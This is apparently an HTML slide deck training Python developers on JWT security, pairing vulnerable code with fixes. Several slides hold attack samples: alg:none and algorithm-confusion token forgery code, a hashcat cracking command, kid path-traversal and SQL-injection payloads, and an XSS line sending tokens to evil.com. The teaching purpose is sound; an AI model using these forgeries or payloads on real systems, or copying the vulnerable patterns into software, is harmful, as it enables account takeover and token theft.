@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Security for Python Developers - Verifhai Training</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
+<style>
+:root { --r-heading-color: #58a6ff; --r-link-color: #58a6ff; }
+.reveal { font-size: 28px; }
+.reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+.reveal h1 { font-size: 2em; }
+.reveal h2 { font-size: 1.5em; color: #58a6ff; }
+.reveal h3 { font-size: 1.2em; color: #79c0ff; }
+.reveal pre { width: 100%; font-size: 0.55em; }
+.reveal pre code { max-height: 500px; padding: 15px; }
+.reveal .small-code pre { font-size: 0.48em; }
+.vuln { color: #f85149; font-weight: bold; }
+.secure { color: #3fb950; font-weight: bold; }
+.warn { color: #d29922; font-weight: bold; }
+.highlight-box { background: rgba(88,166,255,0.15); border-left: 4px solid #58a6ff; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
+.danger-box { background: rgba(248,81,73,0.15); border-left: 4px solid #f85149; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
+.success-box { background: rgba(63,185,80,0.15); border-left: 4px solid #3fb950; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
+table { margin: 0 auto; border-collapse: collapse; font-size: 0.8em; }
+th, td { border: 1px solid #444; padding: 8px 14px; text-align: left; }
+th { background: rgba(88,166,255,0.2); color: #58a6ff; }
+.episode-card { background: linear-gradient(135deg, #161b22, #0d1117); border: 1px solid #30363d; border-radius: 12px; padding: 40px; }
+.badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 0.7em; margin: 0 4px; }
+.badge-l1 { background: #238636; }
+.badge-l2 { background: #9e6a03; }
+.badge-l3 { background: #da3633; }
+</style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<!-- ============================================================ -->
+<!-- TITLE SLIDE -->
+<!-- ============================================================ -->
+<section>
+<h1>JWT Security</h1>
+<h3>for Python Developers</h3>
+<p style="margin-top:40px;color:#8b949e;">8 Episodes &bull; 80 Minutes &bull; L1-L3</p>
+<p style="color:#58a6ff;">Verifhai &bull; HAIAMM Education & Guidance</p>
+<aside class="notes">Welcome to the JWT Security training series for Python developers. We'll cover everything from JWT fundamentals to production architecture.</aside>
+</section>
+
+<!-- ============================================================ -->
+<!-- SERIES OVERVIEW -->
+<!-- ============================================================ -->
+<section>
+<h2>Series Overview</h2>
+<table>
+<tr><th>Episode</th><th>Topic</th><th>Level</th></tr>
+<tr><td>E01</td><td>JWT Structure & Signing</td><td><span class="badge badge-l1">L1</span></td></tr>
+<tr><td>E02</td><td>The alg:none Attack</td><td><span class="badge badge-l1">L1</span></td></tr>
+<tr><td>E03</td><td>Weak Secrets & Brute-Force</td><td><span class="badge badge-l1">L1</span></td></tr>
+<tr><td>E04</td><td>Claims Validation</td><td><span class="badge badge-l1">L1</span></td></tr>
+<tr><td>E05</td><td>Algorithm Confusion & Header Injection</td><td><span class="badge badge-l2">L2</span></td></tr>
+<tr><td>E06</td><td>Token Storage & Transport</td><td><span class="badge badge-l2">L2</span></td></tr>
+<tr><td>E07</td><td>Token Lifecycle & Revocation</td><td><span class="badge badge-l3">L3</span></td></tr>
+<tr><td>E08</td><td>Microservices & Production Patterns</td><td><span class="badge badge-l3">L3</span></td></tr>
+</table>
+</section>
+
+<!-- ============================================================ -->
+<!-- E01: JWT STRUCTURE -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 01</h2>
+<h1>JWT Structure & How Signing Works</h1>
+<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>What is a JWT?</h2>
+<div class="highlight-box">
+Three Base64URL-encoded parts separated by dots
+</div>
+<pre><code class="plaintext">header.payload.signature</code></pre>
+<table>
+<tr><th>Part</th><th>Contains</th><th>Example</th></tr>
+<tr><td>Header</td><td>Algorithm & type</td><td><code>{"alg":"HS256","typ":"JWT"}</code></td></tr>
+<tr><td>Payload</td><td>Claims (data)</td><td><code>{"sub":"user123","role":"admin"}</code></td></tr>
+<tr><td>Signature</td><td>Cryptographic proof</td><td><code>HMAC(header.payload, secret)</code></td></tr>
+</table>
+<aside class="notes">A JWT has three parts. The header says what algorithm is used. The payload contains your claims. The signature proves nobody tampered with either.</aside>
+</section>
+
+<section>
+<h2>Creating a JWT in Python</h2>
+<pre><code class="python">import jwt
+from datetime import datetime, timedelta, timezone
+
+payload = {
+    "sub": "user123",
+    "role": "viewer",
+    "exp": datetime.now(timezone.utc) + timedelta(hours=1),
+    "iss": "myapp.example.com",
+    "aud": "api.example.com"
+}
+
+token = jwt.encode(payload, "my-secret-key", algorithm="HS256")
+print(token)
+# eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMT...</code></pre>
+</section>
+
+<section>
+<h2>Symmetric vs Asymmetric Signing</h2>
+<table>
+<tr><th></th><th>HMAC (HS256)</th><th>RSA (RS256)</th></tr>
+<tr><td>Sign with</td><td>Shared secret</td><td>Private key</td></tr>
+<tr><td>Verify with</td><td>Same secret</td><td>Public key</td></tr>
+<tr><td>Best for</td><td>Single service</td><td>Multi-service</td></tr>
+<tr><td>Risk</td><td>Secret must be shared</td><td>Private key protection</td></tr>
+</table>
+</section>
+
+<section>
+<h2>What Happens When You Tamper</h2>
+<pre><code class="python"># Modify the payload
+payload_data["role"] = "admin"  # Escalate privileges!
+
+# Reassemble with original signature
+tampered_token = f"{parts[0]}.{new_payload}.{parts[2]}"
+
+# Try to verify
+try:
+    jwt.decode(tampered_token, SECRET, algorithms=["HS256"])
+except jwt.InvalidSignatureError:
+    print("SECURE: Tampered token rejected!")</code></pre>
+<div class="success-box">
+The signature catches the tampering. Modified payload = signature mismatch = token rejected.
+</div>
+</section>
+
+<section>
+<div class="danger-box">
+<h3>Key Takeaway</h3>
+<p>JWTs are <strong>signed</strong>, not <strong>encrypted</strong>.</p>
+<p>Anyone can read the payload by Base64-decoding it.</p>
+<p>The signature only prevents <em>tampering</em> &mdash; it does NOT hide the contents.</p>
+</div>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E02: ALG NONE -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 02</h2>
+<h1>The alg:none Attack</h1>
+<p><span class="badge badge-l1">Level 1</span> &bull; 7 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>The Vulnerability</h2>
+<p>The JWT spec includes <code>"alg": "none"</code> for unsigned tokens.</p>
+<p>If your server accepts it, attackers forge tokens with <strong>zero cryptography</strong>.</p>
+<div class="danger-box">
+alg:none = No signature = Anyone can forge tokens
+</div>
+</section>
+
+<section>
+<h2 class="vuln">Vulnerable Code</h2>
+<pre><code class="python">def verify_token(token):
+    try:
+        payload = jwt.decode(
+            token,
+            "my-secret-key",
+            algorithms=["HS256", "none"]  # DANGER!
+        )
+        return payload
+    except jwt.InvalidTokenError:
+        return None</code></pre>
+<p class="vuln">The algorithms list includes "none"</p>
+</section>
+
+<section>
+<h2>The Attack</h2>
+<pre><code class="python">import base64, json
+
+# Craft header with alg: none
+header = base64.urlsafe_b64encode(
+    json.dumps({"alg": "none", "typ": "JWT"}).encode()
+).rstrip(b"=").decode()
+
+# Craft payload with whatever we want
+payload = base64.urlsafe_b64encode(
+    json.dumps({"sub": "attacker", "role": "admin"}).encode()
+).rstrip(b"=").decode()
+
+# No signature needed!
+forged_token = f"{header}.{payload}."</code></pre>
+<div class="danger-box">Full admin access. No secret. No key. Just Base64.</div>
+</section>
+
+<section>
+<h2 class="secure">The Fix</h2>
+<pre><code class="python">def verify_token(token):
+    try:
+        payload = jwt.decode(
+            token,
+            "my-secret-key",
+            algorithms=["HS256"]  # ONLY HS256 - never "none"
+        )
+        return payload
+    except jwt.InvalidTokenError:
+        return None</code></pre>
+<div class="success-box">
+<strong>Rules:</strong><br>
+1. Explicit algorithms list with only what you use<br>
+2. Never include "none" &mdash; ever<br>
+3. One algorithm per use case
+</div>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E03: WEAK SECRETS -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 03</h2>
+<h1>Weak Secrets & Brute-Force</h1>
+<p><span class="badge badge-l1">Level 1</span> &bull; 7 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>Secrets Found in Production</h2>
+<pre><code class="plaintext">secret
+password
+password123
+changeme
+mysecretkey
+your-256-bit-secret   (from jwt.io!)
+jwt_secret</code></pre>
+<p>Every one crackable in <strong>seconds</strong>.</p>
+<pre><code class="bash"># Attacker brute-forces offline - no rate limiting!
+$ hashcat -m 16500 jwt_token.txt wordlist.txt
+# Found: "password123" in 0.3 seconds</code></pre>
+</section>
+
+<section>
+<h2>Secret Strength Comparison</h2>
+<table>
+<tr><th>Secret</th><th>Entropy</th><th>Time to Crack</th><th>Verdict</th></tr>
+<tr><td><code>"secret"</code></td><td>~30 bits</td><td>Seconds</td><td class="vuln">Broken</td></tr>
+<tr><td><code>"MyApp2024!"</code></td><td>~50 bits</td><td>Hours</td><td class="warn">Weak</td></tr>
+<tr><td><code>secrets.token_hex(32)</code></td><td>256 bits</td><td>Heat death of universe</td><td class="secure">Secure</td></tr>
+<tr><td>RSA-2048 key pair</td><td>2048 bits</td><td>Not feasible</td><td class="secure">Secure</td></tr>
+</table>
+</section>
+
+<section>
+<h2 class="secure">The Fix</h2>
+<pre><code class="python">import jwt
+import secrets
+
+# 256-bit cryptographically random secret
+SECRET = secrets.token_hex(32)  # 64 hex chars = 256 bits
+
+# In production, load from environment:
+# SECRET = os.environ["JWT_SECRET"]</code></pre>
+<div class="success-box">
+<strong>Rules:</strong><br>
+1. <code>secrets.token_hex(32)</code> minimum for HMAC<br>
+2. Load from env vars or secrets manager &mdash; never in code<br>
+3. Consider RS256/ES256 &mdash; no shared secret to crack
+</div>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E04: CLAIMS VALIDATION -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 04</h2>
+<h1>Claims Validation Done Right</h1>
+<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
+</div>
+</section>
+
+<section>
+<h2 class="vuln">Tokens That Live Forever</h2>
+<pre><code class="python">def create_token(user_id):
+    payload = {
+        "sub": user_id,
+        "role": "user"
+        # No "exp" claim - token NEVER expires!
+    }
+    return jwt.encode(payload, SECRET, algorithm="HS256")
+
+def verify_token(token):
+    return jwt.decode(
+        token, SECRET, algorithms=["HS256"],
+        options={"verify_exp": False}  # Explicitly disabling!
+    )</code></pre>
+<p>Token leaked in a log file 3 years from now? <span class="vuln">Still works.</span></p>
+</section>
+
+<section>
+<h2>Essential Claims Reference</h2>
+<table>
+<tr><th>Claim</th><th>Purpose</th><th>Without It</th></tr>
+<tr><td><code>exp</code></td><td>Expiration</td><td>Tokens never expire</td></tr>
+<tr><td><code>iat</code></td><td>Issued at</td><td>Can't detect old tokens</td></tr>
+<tr><td><code>nbf</code></td><td>Not before</td><td>Premature use</td></tr>
+<tr><td><code>iss</code></td><td>Issuer</td><td>Cross-service confusion</td></tr>
+<tr><td><code>aud</code></td><td>Audience</td><td>Token reuse across services</td></tr>
+<tr><td><code>sub</code></td><td>Subject</td><td>Can't identify owner</td></tr>
+<tr><td><code>jti</code></td><td>JWT ID</td><td>Can't revoke tokens</td></tr>
+</table>
+</section>
+
+<section>
+<h2 class="secure">Complete Validation</h2>
+<pre><code class="python">def create_token(user_id, role):
+    now = datetime.now(timezone.utc)
+    return jwt.encode({
+        "sub": user_id, "role": role,
+        "exp": now + timedelta(hours=1),
+        "iat": now, "nbf": now,
+        "iss": "auth.myapp.com",
+        "aud": "api.myapp.com",
+        "jti": secrets.token_hex(16)
+    }, SECRET, algorithm="HS256")
+
+def verify_token(token):
+    return jwt.decode(token, SECRET,
+        algorithms=["HS256"],
+        audience="api.myapp.com",
+        issuer="auth.myapp.com",
+        options={"require": ["exp", "iss", "aud", "sub"]}
+    )</code></pre>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E05: ALGORITHM CONFUSION -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 05</h2>
+<h1>Algorithm Confusion & Header Injection</h1>
+<p><span class="badge badge-l2">Level 2</span> &bull; 14 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>Algorithm Confusion (RS256 &rarr; HS256)</h2>
+<div class="highlight-box">
+<p><strong>Normal:</strong> Sign with private key, verify with public key (RS256)</p>
+<p><strong>Attack:</strong> Use the <em>public key</em> as an HMAC secret (HS256)</p>
+<p>The server accepts it because it uses the same key bytes for HMAC verification.</p>
+</div>
+</section>
+
+<section>
+<h2 class="vuln">Vulnerable: Mixed Algorithms</h2>
+<pre><code class="python">def verify_token(token):
+    return jwt.decode(
+        token, PUBLIC_KEY,
+        algorithms=["RS256", "HS256"]  # DANGER: mixed!
+    )</code></pre>
+<h2 style="margin-top:30px;">The Attack</h2>
+<pre><code class="python"># Attacker uses public key as HMAC secret
+public_key_bytes = open("public_key.pem", "rb").read()
+forged = jwt.encode(
+    {"sub": "attacker", "role": "admin"},
+    public_key_bytes,     # Public key as HMAC secret!
+    algorithm="HS256"     # Switch to HMAC
+)</code></pre>
+</section>
+
+<section>
+<h2 class="secure">Fix: Never Mix Algorithm Types</h2>
+<pre><code class="python">def verify_token(token):
+    return jwt.decode(
+        token, PUBLIC_KEY,
+        algorithms=["RS256"]  # ONLY RS256. Never mix.
+    )</code></pre>
+<div class="success-box">
+Never mix symmetric (HS*) and asymmetric (RS*, ES*) in the algorithms list.
+</div>
+</section>
+
+<section>
+<h2>Key ID (kid) Injection</h2>
+<div class="small-code">
+<pre><code class="python"># VULNERABLE: kid in file path
+def get_key(kid):
+    return open(f"/app/keys/{kid}.pem").read()
+# Attack: kid = "../../../dev/null" (empty key)
+
+# VULNERABLE: kid in SQL query
+result = conn.execute(
+    f"SELECT key FROM keys WHERE kid = '{kid}'"
+)
+# Attack: kid = "' UNION SELECT 'my-secret' --"
+
+# SECURE: kid validated against allowlist
+VALID_KEYS = {"key-2024-primary": "actual-secret"}
+def verify_token(token):
+    kid = jwt.get_unverified_header(token).get("kid")
+    if not kid or not re.match(r'^[a-zA-Z0-9\-]+$', kid):
+        raise AuthError("Invalid key ID")
+    key = VALID_KEYS.get(kid)
+    if not key: raise AuthError("Unknown key ID")
+    return jwt.decode(token, key, algorithms=["HS256"])</code></pre>
+</div>
+</section>
+
+<section>
+<h2>JWK/JKU Header Injection</h2>
+<div class="danger-box">
+<p><strong>jwk:</strong> Attacker embeds their own public key in the token</p>
+<p><strong>jku:</strong> Attacker points to their own key server URL</p>
+<p>The token tells the server how to verify itself &mdash; using the attacker's key.</p>
+</div>
+<pre><code class="python"># SECURE: Reject embedded keys entirely
+if "jwk" in header or "jku" in header:
+    raise AuthError("Embedded keys not accepted")
+
+# Fetch keys ONLY from pre-configured, trusted URL
+JWKS_URL = "https://auth.myapp.com/.well-known/jwks.json"</code></pre>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E06: TOKEN STORAGE -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 06</h2>
+<h1>Token Storage & Transport</h1>
+<p><span class="badge badge-l2">Level 2</span> &bull; 10 minutes</p>
+</div>
+</section>
+
+<section>
+<h2 class="vuln">The localStorage Trap</h2>
+<pre><code class="javascript">// VULNERABLE: Any XSS can steal this token
+localStorage.setItem("token", response.access_token);
+
+// Attacker's XSS payload:
+fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))</code></pre>
+<table>
+<tr><th>Storage</th><th>XSS Safe</th><th>CSRF Safe</th><th>Use?</th></tr>
+<tr><td>localStorage</td><td class="vuln">No</td><td class="secure">Yes</td><td class="vuln">No</td></tr>
+<tr><td>sessionStorage</td><td class="vuln">No</td><td class="secure">Yes</td><td class="vuln">No</td></tr>
+<tr><td>HttpOnly Cookie</td><td class="secure">Yes</td><td>With SameSite</td><td class="secure">Yes</td></tr>
+<tr><td>Memory only</td><td class="secure">Yes</td><td class="secure">Yes</td><td>SPAs</td></tr>
+</table>
+</section>
+
+<section>
+<h2 class="secure">HttpOnly Cookie Pattern</h2>
+<pre><code class="python">response.set_cookie(
+    "access_token",
+    access_token,
+    httponly=True,      # JavaScript CAN'T read this
+    secure=True,        # HTTPS only
+    samesite="Strict",  # CSRF protection
+    max_age=3600,       # 1 hour
+    path="/api"         # Only sent to API routes
+)</code></pre>
+<div class="success-box">
+HttpOnly + Secure + SameSite=Strict = defense in depth
+</div>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E07: TOKEN LIFECYCLE -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 07</h2>
+<h1>Token Lifecycle & Revocation</h1>
+<p><span class="badge badge-l3">Level 3</span> &bull; 12 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>The Revocation Problem</h2>
+<div class="highlight-box">
+JWTs are stateless &mdash; the server doesn't track issued tokens.<br><br>
+When a user logs out, changes password, or is compromised &mdash; how do you invalidate the token?
+</div>
+<h3>Solution: Two-Token Pattern</h3>
+<table>
+<tr><th></th><th>Access Token</th><th>Refresh Token</th></tr>
+<tr><td>TTL</td><td>15 minutes</td><td>7 days</td></tr>
+<tr><td>Secret</td><td>JWT_SECRET</td><td>JWT_REFRESH_SECRET</td></tr>
+<tr><td>Audience</td><td>api.myapp.com</td><td>auth.myapp.com</td></tr>
+<tr><td>Purpose</td><td>API access</td><td>Get new access token</td></tr>
+</table>
+</section>
+
+<section>
+<h2>Redis Deny-List</h2>
+<pre><code class="python">import redis
+redis_client = redis.Redis(host="localhost", port=6379)
+
+def verify_access_token(token):
+    payload = jwt.decode(token, SECRET, algorithms=["HS256"],
+        audience="api.myapp.com", issuer="auth.myapp.com")
+
+    if payload.get("type") != "access":
+        raise AuthError("Not an access token")
+
+    # Check deny-list
+    if redis_client.exists(f"revoked:{payload['jti']}"):
+        raise AuthError("Token has been revoked")
+
+    return payload
+
+def revoke_token(jti, ttl):
+    # Auto-expires when token would have expired anyway
+    redis_client.setex(f"revoked:{jti}", int(ttl.total_seconds()), "1")</code></pre>
+</section>
+
+<section>
+<h2>Password Change: Revoke All</h2>
+<pre><code class="python">def on_password_change(user_id):
+    # Any token issued before this timestamp is invalid
+    redis_client.set(
+        f"user_revoked_before:{user_id}",
+        datetime.now(timezone.utc).isoformat()
+    )
+
+# During verification:
+revoked_before = redis_client.get(f"user_revoked_before:{sub}")
+if revoked_before:
+    if token_issued_at < datetime.fromisoformat(revoked_before):
+        raise AuthError("Token issued before credential change")</code></pre>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- E08: MICROSERVICES -->
+<!-- ============================================================ -->
+<section>
+<section>
+<div class="episode-card">
+<h2>Episode 08</h2>
+<h1>Microservices & Production Patterns</h1>
+<p><span class="badge badge-l3">Level 3</span> &bull; 14 minutes</p>
+</div>
+</section>
+
+<section>
+<h2>Gateway Pattern</h2>
+<div class="highlight-box">
+<strong>One gateway signs, every service verifies.</strong><br><br>
+Gateway holds the private key (RS256).<br>
+Services only have the public key &mdash; can verify, never forge.<br>
+Each service has its own audience.
+</div>
+<pre><code class="python">SERVICE_AUDIENCE = "orders-service.internal"
+GATEWAY_PUBLIC_KEY = load_public_key("/etc/keys/gateway-public.pem")
+
+@require_auth(required_scopes={"orders:write"})
+def create_order():
+    user_id = g.current_user  # From verified JWT
+    ...</code></pre>
+</section>
+
+<section>
+<h2>Microservice JWT Rules</h2>
+<table>
+<tr><th>#</th><th>Rule</th></tr>
+<tr><td>1</td><td>Gateway signs, services verify</td></tr>
+<tr><td>2</td><td>Asymmetric keys (RS256/ES256)</td></tr>
+<tr><td>3</td><td>Audience per service</td></tr>
+<tr><td>4</td><td>Scopes for authorization</td></tr>
+<tr><td>5</td><td>Short TTL (5-15 min internal)</td></tr>
+<tr><td>6</td><td>Key rotation via kid</td></tr>
+</table>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- COMPLETE CHECKLIST -->
+<!-- ============================================================ -->
+<section>
+<section>
+<h2>JWT Security Checklist</h2>
+<div class="small-code" style="text-align:left;">
+<p><strong>Algorithm Safety</strong></p>
+<ul>
+<li>Explicit algorithms list (never "none")</li>
+<li>Single algorithm type (don't mix HS* and RS*)</li>
+<li>Algorithm from config, never from token header</li>
+</ul>
+<p><strong>Secret/Key Management</strong></p>
+<ul>
+<li>256+ bit secrets for HMAC</li>
+<li>RSA-2048+ for asymmetric</li>
+<li>From env vars / secrets manager, never hardcoded</li>
+</ul>
+</div>
+</section>
+
+<section>
+<h2>JWT Security Checklist (cont.)</h2>
+<div class="small-code" style="text-align:left;">
+<p><strong>Claims Validation</strong></p>
+<ul>
+<li>exp with reasonable TTL (15 min access)</li>
+<li>aud validated per service</li>
+<li>iss validated against known issuers</li>
+<li>jti for revocation support</li>
+</ul>
+<p><strong>Storage & Transport</strong></p>
+<ul>
+<li>HttpOnly + Secure + SameSite cookies</li>
+<li>Never in localStorage or URLs</li>
+<li>No PII in token payload</li>
+</ul>
+<p><strong>Header Safety</strong></p>
+<ul>
+<li>Reject jwk/jku headers</li>
+<li>Validate kid against allowlist</li>
+</ul>
+</div>
+</section>
+</section>
+
+<!-- ============================================================ -->
+<!-- END -->
+<!-- ============================================================ -->
+<section>
+<h1>Thank You</h1>
+<h3>Test your knowledge</h3>
+<p>Take the L1, L2, or L3 assessments</p>
+<p style="margin-top:40px;color:#58a6ff;">Verifhai &bull; HAIAMM Education & Guidance</p>
+<p style="color:#8b949e;">EG-LAB-JWT-001 &bull; v1.0</p>
+</section>
+
+</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
+<script>
+Reveal.initialize({
+  hash: true,
+  slideNumber: 'c/t',
+  showSlideNumber: 'all',
+  transition: 'slide',
+  plugins: [RevealHighlight, RevealNotes]
+});
+</script>
+</body>
+</html>
